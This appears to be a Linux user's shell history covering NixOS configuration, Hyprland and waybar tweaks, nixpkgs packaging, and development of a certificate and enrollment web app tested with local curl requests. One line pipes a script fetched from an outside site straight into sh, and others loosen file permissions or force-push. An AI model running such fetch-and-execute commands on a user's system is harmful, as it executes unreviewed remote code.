+batt
+flatpak upgrade
+batt
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+doom .
+emacs .
+doom
+flatpak upgrade
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+cd /etc/nixos
+sudo nixos-rebuild upgrade
+sudo nixos-rebuild switch upgrade
+sudo nix-channels —list
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade
+sudo nix-channel --update
+cd /etc/nixos
+sudo hx .
+sudo nix-channel --update
+sudo nixos-rebuild switch --upgrade
+flatpak install flathub dev.zed.Zed
+zeditor .
+zed
+zed-editor
+zed-zed
+flatpak uninstall flathub dev.zed.Zed
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+zeditor .
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+hydra-check --channel unstable bash
+cd /etc/nixos
+nix-channel --update
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+(eza --icons=always -1d ...(ls).name | from ssv -nm 1).column0
+def ll []: { ls | update name {|row| $row | grid --color --icons | str trim } }
+ghci
+cd /etc/nixos
+sudo hx .
+sudo ni
+sudo nixos-rebuild switch --upgrade
+ghc
+warp
+snap
+sudo snap install --classic waveterm
+appimage-run
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+cd ~/Downloads/
+neofetch
+clear
+pfetch
+hx .
+cd projects/freelance/
+ls
+cd certiapp/
+ls
+hx .
+appimage-run waveterm-linux-x86_64-0.10.1.AppImage
+ani-cli 
+cd projects/freelancing/certiapp/
+cd projects/freelance/certiapp/
+git add .
+git commit -m lfg
+git push
+zed .
+zeditor .
+deno run dev
+node ./api/server.js<\n>
+zeditor .
+deno run dev
+cd api
+node ./api/server.js<\n>
+npm i multer
+npm i fs
+node server.js<\n>
+deno run dev
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+sqlite3 ./api/certificates.db
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+sqlite3 ./api/certificates.db
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+deno run dev
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+deno run dev
+node server.js<\n>
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+node server.js<\n>
+deno run dev
+node server.js<\n>
+deno run dev
+node server.js<\n>
+deno run dev
+git add .
+git commit -m winning
+git push
+touch .gitignore
+git revert winning
+git reset --soft HEAD~1<\n>
+git reset --hard HEAD~1
+cd ..
+cd ~/projects/freelance/
+rm -rf certiapp/
+git clone https://github.com/chiqorein/certiapp.git
+cd certiapp/
+ls
+hx .
+panger
+pacman 
+pacman install
+pacman --help
+nmcli device wifi connect "hmm"
+nmcli device wifi
+nmcli device wifi connect "hmm"
+zeditor .
+deno server.js
+bun server.js
+node server.js<\n>
+npm i
+zeditor .
+deno run dev
+node server.js<\n>
+deno run dev
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+flatpak install flathub org.wezfurlong.wezterm
+flatpak uninstall flathub org.wezfurlong.wezterm
+cd /etc/nixos
+cd ~/projects/NIXCF/
+ls
+git branch xmonad
+git status
+thunar .
+cd ~/.config/xmonad/
+ls
+thunar .
+git add .
+cd ~/projects/NIXCF/
+git add .
+git commit -m monad
+git push
+cd /etc/nixos
+hx .
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+reboot
+cd ~/hypr
+cd ~/.config/hypr
+ls
+hx .
+cd ~/projects
+cd clones/
+git clone https://github.com/Itz-Abhishek-Tiwari/NamiConfig.git
+cd ~/.config
+ls
+thunar .
+cd ~/.config/hypr
+alacritty
+hx .
+hx .
+zeditor .
+reboot
+cd ~/.config/hypr
+hx .
+cd Downloads
+ls
+thunar .
+cd Downloads
+ls
+nasa-Q1p7bh3SHj8-unsplash.jpg
+thunar .
+hx hyprpaper.conf
+reboot
+cd ~/.config/hyprpm
+cd ~/.config/hypr
+ls
+hx .
+cd ..
+ls
+cd way
+cd waybar/
+ls
+hx .
+cd ~/projects
+cd cloned
+cd clones
+mkdir way
+cd way
+ls
+git clone https://github.com/shot-codes/dotfiles.git
+cd ..
+thunar .
+thunar .
+reboot
+cd ~/.config/rofi
+ls
+hx .
+cd ~/.config/waybar
+hx .
+cd ..
+cd hypr
+ls
+cd ~/projects
+ls
+cd cloned
+cd clones
+ls
+cd NamiConfig/
+ls
+hx .
+thunar .
+cd .config
+ls
+cd hypr
+hx .
+hx .
+ani-cli
+bluetoothcli
+bluetooth
+cd ~/projects/freelance/certiapp/
+zeditor .
+deno run dev
+cd ~/projects/freelance/certiapp/
+deno run dev
+sqlite3 ./api/certificates.db "SELECT * FROM certificates;"
+node api/server.js<\n>
+deno run dev
+cd api
+node server.js<\n>
+deno run dev
+node server.js<\n>
+deno run dev
+flatpak upgrade
+sct 4000
+git add .
+node server.js<\n>
+cd Downloads/
+appimage-run Horse-0.70.4-x64.AppImage
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+cd ~/projects/clones/
+git clone --depth 1 https://github.com/doomemacs/doomemacs
+git clone --depth 1 https://github.com/doomemacs/doomemacs ~/.emacs.d
+cd ~/.emacs.d
+cd bin/doom install
+cd bin/doom 
+/bin/doom install 
+/home/$USER/.emacs.d/bin/doom install
+~/.emacs.d/bin/doom install
+cd ~/.emacs.d/bin/doom 
+ls
+tree
+emacs
+rm -rf ~/.emacs.d
+cd ..
+rm -rf ~/.emacs.d
+git clone --depth 1 https://github.com/doomemacs/doomemacs ~/.emacs.d
+cd ~/.emacs.d/bin/doom 
+rm -rf ~/.emacs.d
+git clone --depth 1 https://github.com/doomemacs/doomemacs ~/.config/emacs<\n>~/.config/emacs/bin/doom install
+doom .
+emacs .
+hx ~/.profile
+emacs .
+hx ~/.profile
+emacs 
+cd ~/.emacs.d/bin/doom 
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+warp-terminal
+warp
+warpterm
+cd ~/.config/hypr
+ls
+cd Downloads/
+hx .
+thunar .
+cd ~/.config/hypr
+ls
+deno run dev
+node server.js<\n>
+deno run dev
+node server.js<\n>
+deno run dev
+node server.js<\n>
+deno run dev
+cd api
+sqlite3 ./api/certificates.db
+cd ..
+sqlite3 ./api/certificates.db
+deno run dev
+cd /uploads/photos/
+cd api
+cd /uploads/photos/
+deno run dev
+node server.js<\n>
+deno run dev
+node server.js<\n>
+deno run dev
+thunar .
+node server.js<\n>
+deno run dev
+cd ..
+deno run dev
+npm i @types/react
+npm i react
+npm i react-toastify
+ani-cli
+cd ~/projects/freelance/certiapp/
+zeditor .
+cd ~/projects/freelance/certiapp/
+cd api
+git add .
+git commit -m yes
+git push
+deno run dev
+node server.js<\n>
+npm i moment
+cd api
+sqlite3 
+sqlite3 certificates.db
+cd ..
+npm i antd
+deno run dev
+npm install axios moment jspdf react-datepicker @types/react
+deno run dev
+git add .
+git commit -m working 
+git push
+ls
+hx .
+cd projects/freelance/certiapp/
+ls
+hx .
+:q
+cd projects/freelance/certiapp/
+zeditor .
+cd projects/freelance/certiapp/
+cd api
+npm i react-router-dom
+deno run dev
+npm i next/router
+deno run dev
+curl -X POST http://localhost:5000/api/enrollment -H "Content-Type: application/json" -d '{"formNumber":"ENROLL-2024-2025-0001","issueDate":"2024-03-19","firstName":"John","lastName":"Doe","email":"john@example.com","phone":"1234567890","photo":"https://api.placeholder.com/300x300"}'
+node server.js<\n>
+cd api/
+sqlite3 certificates.db
+sqlite3 enrollment.sqlite
+sqlite3 ./enrollment.sqlite "SELECT * FROM enrollments;"
+sqlite3 ./enrollment.sqlite "SELECT * FROM enrollments ORDER BY createdAt DESC;"
+curl -X POST http://localhost:5000/api/enrollment -H "Content-Type: application/json" -d '{"formNumber":"ENROLL-2024-2025-0001","issueDate":"2024-03-19","firstName":"John","lastName":"Doe","email":"john@example.com","phone":"1234567890","photo":"https://api.placeholder.com/300x300"}'
+node server.js<\n>
+curl -X POST http://localhost:5000/api/enrollment \<\n>-H "Content-Type: application/json" \<\n>-d '{<\n>  "formNumber": "12345",<\n>  "issueDate": "2024-12-19",<\n>  "validDate": "2025-12-19",<\n>  "firstName": "John",<\n>  "lastName": "Doe",<\n>  "email": "john.doe@example.com",<\n>  "phone": "1234567890",<\n>  "fathersName": "Richard Doe",<\n>  "address": "123 Elm Street",<\n>  "drivingLicenseNo": "DL123456789",<\n>  "badgeNo": "BADGE001",<\n>  "gender": "Male",<\n>  "dateOfBirth": "1990-01-01",<\n>  "educationalQualification": "Bachelor of Science",<\n>  "courseType": "Basic Driving",<\n>  "emergencyContactName": "Jane Doe",<\n>  "emergencyContactRelation": "Sister",<\n>  "emergencyContactPhone": "0987654321",<\n>  "photo": "https://api.placeholder.com/300x300"<\n>}'<\n>
+curl -X POST http://localhost:5000/api/enrollment -H "Content-Type: application/json" -d '{"formNumber":"12345","issueDate":"2024-12-19","validDate":"2025-12-19","firstName":"John","lastName":"Doe","email":"john.doe@example.com","phone":"1234567890","fathersName":"Richard Doe","address":"123 Elm Street","drivingLicenseNo":"DL123456789","badgeNo":"BADGE001","gender":"Male","dateOfBirth":"1990-01-01","educationalQualification":"Bachelor of Science","courseType":"Basic Driving","emergencyContactName":"Jane Doe","emergencyContactRelation":"Sister","emergencyContactPhone":"0987654321","photo":"https://api.placeholder.com/300x300"}'<\n>
+curl http://localhost:5000/test<\n>
+node server.js<\n>
+node enrollment.js<\n>
+curl -X POST http://localhost:5000/api/enrollment -H "Content-Type: application/json" -d '{"formNumber":"12345","issueDate":"2024-12-19","validDate":"2025-12-19","firstName":"John","lastName":"Doe","email":"john.doe@example.com","phone":"1234567890","fathersName":"Richard Doe","address":"123 Elm Street","drivingLicenseNo":"DL123456789","badgeNo":"BADGE001","gender":"Male","dateOfBirth":"1990-01-01","educationalQualification":"Bachelor of Science","courseType":"Basic Driving","emergencyContactName":"Jane Doe","emergencyContactRelation":"Sister","emergencyContactPhone":"0987654321","photo":"https://api.placeholder.com/300x300"}'<\n>
+node enrollment.js<\n>
+curl -X POST http://localhost:5000/api/enrollment -H "Content-Type: application/json" -d '{"formNumber":"12345","issueDate":"2024-12-19","validDate":"2025-12-19","firstName":"John","lastName":"Doe","email":"john.doe@example.com","phone":"1234567890","fathersName":"Richard Doe","address":"123 Elm Street","drivingLicenseNo":"DL123456789","badgeNo":"BADGE001","gender":"Male","dateOfBirth":"1990-01-01","educationalQualification":"Bachelor of Science","courseType":"Basic Driving","emergencyContactName":"Jane Doe","emergencyContactRelation":"Sister","emergencyContactPhone":"0987654321","photo":"https://api.placeholder.com/300x300"}'<\n>
+node enrollment.js<\n>
+cd ~/projects/freelance/certiapp/api
+node server.js<\n>
+sqlite3 ./enrollment.sqlite "SELECT * FROM enrollments ORDER BY createdAt DESC;"
+ani-cli
+cd ~/.config/hypr
+hx .
+cd ~
+ani-cli
+cd ~/projects/freelance/certiapp/api
+cd ~/projects/freelance/certiapp
+hx .
+zeditor .
+node server.js<\n>
+deno run dev
+zeditor .
+deno run dev
+npx shadcn@latest add input<\n>
+npm install @hookform/resolvers zod react-hook-form axios
+deno run dev
+node enrollment.js<\n>
+lsblk
+cd /sda1/
+sudo blkid /dev/sda1<\n>
+mkdir -p ~/mnt/sda1<\n>
+mkdir ~/mnt/sda1<\n>
+sudo mount -t vfat /dev/sda1 ~/mnt/sda1<\n>
+df -h | grep sda1<\n>
+sudo thunar .
+cd Downloads/
+sudo mv `~/Downloads/can't hurt me.epub` ~/mnt/sda1/documents
+sudo umount ~/mnt/sda1<\n>
+sudo mount -o uid=$(id -u),gid=$(id -g) /dev/sda1 ~/mnt/sda1<\n>
+sudo mount -o uid=1000,gid=100 /dev/sda1 ~/mnt/sda1<\n>
+sudo mv --no-preserve=ownership ~/Downloads/cant_hurt_me.epub ~/mnt/sda1/documents<\n>
+sudo mv ~/Downloads/cant_hurt_me.epub ~/mnt/sda1/documents<\n>
+thunar .
+sudo mv ~/Downloads/cant_hurt_me.epub ~/mnt/sda1/documents<\n>
+sudo mount -o uid=1000,gid=100 /dev/sda1 ~/mnt/sda1<\n>
+lsblk
+sudo umount ~/mnt/sda1<\n>
+sudo mount -o uid=1000,gid=100 /dev/sda1 ~/mnt/sda1<\n>
+sudo mount -t vfat /dev/sda1 ~/mnt/sda1<\n>
+sudo mount -o uid=$(id -u),gid=$(id -g) /dev/sda1 ~/mnt/sda1<\n>
+dmesg | tail -20<\n>
+sudo partprobe<\n>sudo fdisk -l<\n>
+sudo mount -t vfat /dev/sda1 ~/mnt/sda1<\n>
+sudo mount -o uid=$(id -u),gid=$(id -g) /dev/sda1 ~/mnt/sda1<\n>
+sudo umount ~/mnt/sda1<\n>
+sudo mount -t vfat /dev/sda1 ~/mnt/sda1<\n>
+sudo umount ~/mnt/sda1<\n>
+sudo mount -o uid=1000,gid=100 /dev/sda1 ~/mnt/sda1<\n>
+thunar .
+sudo umount ~/mnt/sda1<\n>
+sudo mount -o uid=1000,gid=100 /dev/sda1 ~/mnt/sda1<\n>
+lsblk
+mkdir -p ~/mnt/sda1<\n>
+mkdir ~/mnt/sda1<\n>
+sudo mount -o uid=1000,gid=100 /dev/sda1 ~/mnt/sda1<\n>
+df -h | grep sda1<\n>
+sudo umount ~/mnt/sda1<\n>
+sudo mount -o uid=1000,gid=100 /dev/sda1 ~/mnt/sda1<\n>
+sudo umount ~/mnt/sda1<\n>
+cd ~/projects/freelance/certiapp
+zeditor .
+cd api
+git add .
+git commit -m working 
+git push
+curl -O https://registry.npmjs.org/svelte-language-server/-/svelte-language-server-0.7.8.tgz<\n>sha256sum svelte-language-server-0.7.8.tgz<\n>
+curl -O https://registry.npmjs.org/svelte-language-server/-/svelte-language-server-0.1.0.tgz<\n>
+sha256sum svelte-language-server-0.1.0.tgz<\n>
+sha256sum svelte-language-server-0.1.0.tgz<\n>echo "IbLjoXLN8sdnGy5SmoEeJUl1BzCulptMFtbJc+IRH70=" | base64 -d | xxd -p<\n>
+echo "84c45380743ea75f2bca4dde0496c129b147c92f3cb8b5d5fcc88851ee445bc1" | xxd -r -p | base64<\n>
+sha256-IbLjoXLN8sdnGy5SmoEeJUl1BzCulptMFtbJc+IRH70=
+sha256 IbLjoXLN8sdnGy5SmoEeJUl1BzCulptMFtbJc+IRH70=
+sha256sum IbLjoXLN8sdnGy5SmoEeJUl1BzCulptMFtbJc+IRH70=
+deno run dev
+node enrollment.js<\n>
+deno run dev
+npx shadcn@latest add card<\n>
+deno run dev
+git add .
+git commit -m yyayyaya
+git push
+lsblk
+sudo mount -o uid=1000,gid=100 /dev/sda1 ~/mnt/sda1<\n>
+flatpak install --from https://flathub.org/repo/appstream/org.kicad.KiCad.flatpakref
+sudo umount ~/mnt/sda1<\n>
+flatpak install --from https://flathub.org/repo/appstream/org.kicad.KiCad.flatpakref
+ani-cli
+cd ~/projects/freelance/certiapp
+cd ~/projects/freelance/certiapp/api
+deno run dev
+cd ~/projects/freelance/certiapp
+zeditor .
+npx shadcn@latest add alert
+deno run dev
+cd ~/projects/clones/
+git clone https://github.com/mathix420/dotfiles.git
+mkdir rofi
+cd rofi/
+git add .
+git commit -m yyayyaya
+git push
+git clone https://github.com/mathix420/dotfiles.git
+npx shadcn-ui@latest add button table dialog
+npx shadcn@latest add button table dialog
+npm install sqlite3
+npm install sqlite3<\n>npx shadcn-ui@latest add button
+deno run dev
+bun run dev
+cd ~/projects/freelance/certiapp
+cd ~/projects/freelance/certiapp/api
+sqlite form5aDB
+sqlite3 form5aDB;
+deno run dev
+node enrollment.js<\n>
+cd ~/projects/freelance/certiapp/api
+cd ~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/api
+cd ~/projects
+mkdir issues
+cd issues/
+mkdir nixxos
+cd nixxos/
+mkdir fennel
+cd fennel/
+hx shell.nix
+ni-shell
+cd ~/projects/issues
+ls
+cd nixxos/fennel/
+ls
+cd ~/.config/fennel/
+h .
+hx .
+hx .
+nix-shell
+hx .
+cd ~/.config/fennel/
+hx .
+cd ~/.config/fennel/
+hx .
+nix-shell
+hx .
+cd ~/.config/fennel/
+hx .
+cd ~/.config/fennel/
+hx .
+nix-shell
+cd ~/.config/fennel/
+hx .
+cd ~/projects/issues
+ls
+cd ~/projects/issues/nixxos/fennel
+(let [RL (require :readline)]<\n>  (RL.set_options {<\n>    :histfile "~/.local/share/fennel/history.fnl"<\n>    :keeplines 1000<\n>  })<\n>  (RL.set_readline_name "fennel")<\n><\n>  ;; State to track Ctrl-D presses<\n>  (var ctrl-d-pressed false)<\n><\n>  ;; Handle EOF (Ctrl-D)<\n>  (fn handle-eof []<\n>    (if ctrl-d-pressed<\n>      (os.exit 0)<\n>      (do<\n>        (set ctrl-d-pressed true)<\n>        ;; Return a function that will trigger the error when called<\n>        (fn [] (. nil nonexistent-field)))))<\n><\n>  (set _G.handle_eof handle-eof))
+cd ~/projects/issues/nixxos/fennel
+hx .
+cd ~/.
+cd ~/.config/fennel/
+hx .
+zeditor .
+hx .
+hxx .
+hx .
+hx .
+which fennel<\n>cat $(which fennel)
+which fennel
+cat $(which fennel)
+cat (which fennel)
+~/projects/issues/nixxos/
+ls
+mkdir watchman
+cd watchman/
+hx shell.nix
+shell.nix
+ls
+nix-shell
+hx flake.nix
+ls
+thunar .
+ls
+# Build the package<\n>nix build<\n><\n># If you want to enter a shell with the package<\n>nix shell<\n><\n># Test if the Python scripts are installed<\n>./result/bin/watchman-make --help<\n>./result/bin/watchman-wait --help
+hx .
+nix build
+./result/bin/watchman-make --help<\n>./result/bin/watchman-wait --help
+~./result/bin/watchman-make --help<\n>./result/bin/watchman-wait --help
+ls -l result/bin/watchman-*
+ls
+ls -l result/bin/watchman
+ls -l result/bin/
+cd watchman/
+hx .
+nix build
+nix-shell
+ls
+cd result
+ls
+cd bin
+ls
+cd ..
+hx .
+zeditor .
+nix-shell -p nixpkgs-review --run "nixpkgs-review rev HEAD"
+zeditor .
+nixfmt defaukt.nix
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+nixfmt default.nix
+hx .
+nixfmt default.nix
+cd ~/projects/freelance/certiapp/api
+cd ~/projects/freelance/certiapp/
+zeditor .
+git add .
+git commit -m pushpush
+git push
+node enrollment.js<\n>
+npm install express sqlite3 moment cors multer body-parser
+deno run dev
+node enrollment.js<\n>
+deno run dev
+cd ~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/api
+sudo nixos-rebuild switch --upgrade<\n>
+nix-instantiate --parse ./modules/packages.nix<\n>
+cd /etc/nixos
+nix-instantiate --parse ./modules/packages.nix<\n>
+sudo nixos-rebuild switch --upgrade ./modules/packages.nix
+deno run dev
+cd ..
+rm -rf certiapp/
+git clone https://github.com/qxrein/certiapp
+cd certiapp/
+zeditor .
+deno run dev
+npm i
+deno run dev
+curl -X POST http://localhost:5000/api/enrollment -H "Content-Type: application/json" -d '{"formNumber": "ENROLL-2024-2025-0001", "firstName": "John", "fathersName": "James", "address": "123 Main St", "phone": "1234567890", "drivingLicenseNo": "DL123456", "badgeNo": "B789", "issueDate": "2024-12-23", "validDate": "2025-12-23", "gender": "Male", "dateOfBirth": "1990-01-01", "educationalQualification": "Graduate", "emergencyContactName": "Jane", "emergencyContactRelation": "Spouse", "emergencyContactPhone": "9876543210"}'
+chmod 666 enrollment.sqlite certificates.db
+cd ~/projects/freelance/certiapp/api
+chmod 666 enrollment.sqlite certificates.db
+curl -X POST http://localhost:5000/api/enrollment -H "Content-Type: application/json" -d '{"formNumber": "ENROLL-2024-2025-0001", "firstName": "John", "fathersName": "James", "address": "123 Main St", "phone": "1234567890", "drivingLicenseNo": "DL123456", "badgeNo": "B789", "issueDate": "2024-12-23", "validDate": "2025-12-23", "gender": "Male", "dateOfBirth": "1990-01-01", "educationalQualification": "Graduate", "emergencyContactName": "Jane", "emergencyContactRelation": "Spouse", "emergencyContactPhone": "9876543210"}'
+node enrollment.js<\n>
+npx shadcn-ui@latest add input
+pnpm dlx shadcn@latest add input<\n>
+npx shadcn@latest add input<\n>
+cd ~/projects/freelance/certiapp/api
+cd ~/projects/freelance/certiapp/
+zeditor .
+git add .
+git commit -m push api enroll
+git commit -m push apienroll
+git commit -m pushapienroll
+git push
+node enrollment.js<\n>
+npx shadcn-ui add card<\n>npx shadcn-ui add input<\n>npx shadcn-ui add label<\n>npx shadcn-ui add button
+npx shadcn@latest add label
+git add .
+git commit -m pushapienroll
+git push
+cd ~/projects/freelance/certiapp/
+git add .
+git commit -m pushapienroll
+cd ~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/api
+deno
+zeditor .
+deno run dev
+cd /etc/nixos
+sudo hx .
+sudo nix
+sudo nixos-rebuild switch --upgrade
+cd downloads
+cd Downloads
+unzip Outfit.zip
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+sudo hx .
+sudo nixos-rebuild switch --upgrade
+cd Downloads/
+cd statis
+cd static
+sudo cp Outfit-ExtraBold.ttf /usr/share/fonts/<\n>
+sudo cp Outfit-ExtraBold.ttf /usr/local/share/fonts
+sudo fc-cache -fv<\n>
+hx tinker.html
+thunar .
+cd ~/projects/freelance/certiapp/api
+cd ~/projects/freelance/certiapp
+zeditor .
+deno run dev
+deno upgrade
+cd /etc/nixos
+sudo nix-channel --update<\n>
+deno run dev
+sudo nixos-rebuild switch --upgrade<\n>
+zeditor .
+cd /etc/nixos
+tt
+hx .
+cd projects/ziglings.org/
+ls
+cd exercises/
+ls
+git fetch
+git pull
+git stash
+git pull
+deno run dev
+node enrollment.js<\n>
+deno run dev
+hx .
+cd /etc/nixos
+hx num.py
+hx .
+hx num.py
+kitty .
+cd ~/.config/hypr
+hx .
+cd ~/.config/hypr
+hx .
+cd ~/.config/kitty
+ls
+hx .
+cd ~/.config/kitty
+ls
+hx .
+ls
+cd ~/projects/freelance/certiapp
+ls
+hx .
+cd ~/projects/freelance/certiapp
+node enrollment.js<\n>
+cd ~/projects/freelance/certiapp
+cd api
+cd ~/projects/freelance/certiapp
+zeditor .
+hx .
+cd ~/.config/kitty
+ls
+cd ~/projects/freelance/certiapp
+hx .
+hx .
+ls
+cd ~/projects/freelance/certiapp
+cd ~/projects/freelance/certiapp/api
+hx .
+pfetch
+ls
+hx .
+sh -ec "$(curl -fsSL 'https://ftwa.mathix.dev/v/chat-gpt?os=linux&bw=firefox&path=%2Fusr%2Fbin%2Ffirefox')"
+cd ~/config/hypr
+cd ~/.config/hypr
+hx .
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade<\n>
+cd ..
+ls
+mkdir swaybar
+swaybar
+cd hypr
+hx .
+reboot
+cd ~/.config/hypr
+reboot
+cd ~/projects/freelance/certiapp/api
+cd ~/projects/freelance/certiapp/
+zeditor .
+cd ~/.config/waybar
+ls
+hx .
+killall waybar<\n>waybar &<\n>
+kill waybar<\n>waybar &<\n>
+waybar
+reboot
+cd ~/.config/waybar
+waybar
+cd ~/.config/waybar
+hx .
+waybar
+hx .
+waybar
+hx .
+waybar
+hx .
+waybar
+hx .
+cd ~/.config/hypr
+hx .
+waybar
+reboot
+cd ~/.config/hypr
+cd .
+cd ..
+cd waybar
+hx .
+waybr
+waybar
+cd ~/projects/clones
+ls
+git clone https://github.com/UnFunnyGuy/hyprland-dots.git
+thunar .
+cd ~/.config
+thunar .
+waybar
+git clone https://github.com/rDini/dotconfig.git
+thunar .
+thunar .
+waybar 
+reboot
+cd ~/.config
+cd /etc/nixos
+hx .
+sudo hx .
+sudo nixos-rebuild switch --upgrade<\n>
+hyprpanel
+cd ~/.config/hypr
+hx .
+reboot
+cd ~/projects/
+cd freelance/certiapp/
+zeditor .
+cd freelance/certiapp/
+cd ~/projects/freelance/certiapp/
+ls
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --upgrade<\n>
+reboot
+which hyprpanel
+cd ~/.config/hypr
+ls
+reboot
+cd ~/.config/hypr
+cd /etc/nixos
+hx .
+sudo hx .
+sudo nixos-rebuild switch 
+upower
+cd ~/.config/hypr
+hx .
+reboot
+cd ~/.config/hypr
+hx .
+hyprpanel
+cd /etc/nixos
+hx 
+hx .
+sudo hx .
+upower
+sudo hx .
+reboot
+hyprpanel
+upower
+cd /etc/nixos
+hx .
+sudo hx .
+sudo nixos-rebuild switch 
+reboot
+sudo systemctl status upower.service
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch 
+sudo systemctl status upower.service
+upower
+sudo systemctl enable upower.service
+reboot
+sudo systemctl enable upower.service
+cd /etc/nixos
+hx .
+sudo hx .
+reboot
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch 
+sudo systemctl enable upower.service
+sudo systemctl status upower.service
+hyprpanel
+reboot
+cd /etc/nixos
+ls
+cd ~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/api
+zeditor .
+node enrollment.js<\n>
+deno run dev
+deno
+git add .
+git commit -m pushapienroll
+git push
+cd ~/projects/clones
+ls
+rm -rf nixpkgs
+nix-prefetch-url --unpack https://github.com/conda-forge/miniforge/archive/24.11.00.tar.gz
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+git clone https://github.com/NixOS/nixpkgs.git
+ls
+rm -rf nixpkgs
+git clone https://github.com/NixOS/nixpkgs.git
+git clone --depth 1 https://github.com/NixOS/nixpkgs.git<\n>
+cd nixpkgs/
+ls
+cd pkgs
+ls
+cd python-modules
+cd development/
+cd python-modules
+ls
+cd miniforge
+mkdir miniforge
+hx default.nix
+cd miniforge/
+ls
+hx default.nix
+cd ..
+ls
+mv default.nix miniforge/
+cd miniforge/
+ls
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+git pull
+git add .
+git commit -m "added miniforge" 
+git push
+git remote add fork git@github.com:qxrein/nixpkgs.git<\n>git push fork master
+hx .
+zeditor .
+ls
+nixfmt ./default.nix
+nixfmt default.nix
+nixfmt pkgs/development/python-modules/miniforge/default.nix
+git pull
+gh pr checkout 368371
+gh repo set-default
+gh pr checkout 368371
+git stash
+gh pr checkout 368371
+nixfmt pkgs/development/python-modules/miniforge/default.nix
+cd ~/projects/clones
+cd nixpkgs/
+nixfmt pkgs/development/python-modules/miniforge/default.nix
+nix-env -iA nixpkgs.nixfmt
+nix profile -iA nixpkgs.nixfmt
+nix profile -i nixpkgs.nixfmt
+nix profile nixpkgs.nixfmt
+nix profile nixpkgs.nixfmtnix shell nixpkgs#nixfmt
+nixfmt pkgs/development/python-modules/miniforge/default.nix
+cd pkgs/development/python-modules/miniforge/
+hx .
+zeditor .
+nixfmt default.nix
+zeditor .
+nixfmt default.nix
+zeditor .
+nixfmt default.nix
+git pull
+git fetch
+gh pr checkout 368371
+git pull
+gh pull
+gh fetch
+git pull
+git pull --depth 1 <\n>
+nixfmt default.nix
+git reset --hard HEAD~1
+git push -f origin branch-name
+git branch    # List branches to find your branch name<\n>git push -f origin your-actual-branch-name
+git push -f origin patch-3
+git remote -v
+git push -f fork patch-3
+ls
+hx .
+hx default.nix
+git push -f fork patch-3
+ls
+git push -f origin patch-3
+ls
+git checkout patch3
+git c=branch
+git branch
+git checkout master
+cd ..
+rm -rf miniforge
+git checkout master
+cd miniforge/
+ls
+nixfmt default.nix
+git push -f origin patch-3
+git push -f fork master
+nix-shell
+nixfmt default.nix
+cd ..
+nix-shell
+cd miniforge/
+nixfmt default.nix
+zeditor .
+cd ~/projects/clones/nixpkgs/
+cd pkgs/development/python-modules/miniforge/
+cd ~/projects/clones/nixpkgs/pkgs/development/python-modules/miniforge/
+hx .
+cd /etc/nixos
+ls
+hx .
+ls
+cd modules
+ls
+hx ghostty.nix
+sudo hx ghostty.nix
+cd ..
+sudo hx .
+ls
+hx .
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+yazi
+ls
+themes
+pfetch
+cd ~/projects/clones/nixpkgs/pkgs/development/python-modules/miniforge/
+ls
+cd ~/.config/hypr
+ls
+hx .
+pfetch
+neofetch
+clear
+neofetch
+pfetch
+hx .
+cd ~/projects/clones/nixpkgs/pkgs/development/python-modules/miniforge/
+cd ~/projects/freelance/certiapp/api
+cd 
+cd ~/projects/freelance/certiapp/api
+cd ~/projects/freelance/certiapp/
+clear
+ls
+deno run dev
+zeditor .
+git add .
+git commit -m "added" 
+git push
+cd ~/projects/freelance/certiapp/
+zeditor .
+cd ~/projects/freelance/certiapp/api
+npx shadcn@latest add badge
+git add .
+git commit -m "added" 
+git push
+npm run build
+deno run dev
+deno run build
+code .
+deno run build
+cd ~/projects/freelance/certiapp/api
+cd ~/projects/freelance/certiapp/
+thunar .
+deno run build
+cd ~/projects/freelance/certiapp/api
+zeditor .
+cd ~/projects/freelance/certiapp/anxj/api
+deno run build
+deno run dev
+code .
+clear
+npm install sqlite3 @aws-sdk/client-s3 @aws-sdk/s3-request-presigner
+node enrollment.js<\n>
+node backend.js<\n>
+sqlite3 signatures.db;
+sqlite3 certificates.db;
+npm install sqlite3 @aws-sdk/client-s3 @aws-sdk/s3-request-presigner
+node backend.js
+curl -X POST http://localhost:3000/society \<\n>  -H "Content-Type: application/json" \<\n>  -d '{<\n>    "schoolName": "Test School",<\n>    "schoolLicense": "LICENSE123",<\n>    "licenseValidUntil": "2025-12-31",<\n>    "writerName": "John Doe",<\n>    "instructorName": "Jane Smith"<\n>  }'
